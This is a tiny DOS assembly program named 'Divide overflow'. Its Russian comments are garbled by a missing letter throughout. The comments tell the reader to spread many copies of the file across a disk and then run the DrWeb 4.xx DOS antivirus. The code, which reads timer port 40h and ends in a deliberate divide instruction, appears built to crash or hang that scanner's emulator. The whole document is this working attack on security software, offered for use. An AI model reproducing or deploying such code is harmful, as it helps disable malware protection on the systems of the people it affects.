; for use: Созд йте побольше т ких ф йликов и р зброс йте по диску.
; Имя и р сширение ф йлов может быть любое.
; З пустите DrWeb 4.xx DOS ...

.model tiny             ; Name: Divide overflow
.code
org 100h
start:      push    ax
        dec bx
        add ax,[si]
loc_:
        aam 3bh
        xchg    ax,dx
        inc dx
        in  al,40h          ; port 40h, 8253 timer 0 clock
        inc bp
        idiv    byte ptr [bp+si]
        jnz loc_

;       pop ax
;       retn
end start               ; (c) 2b
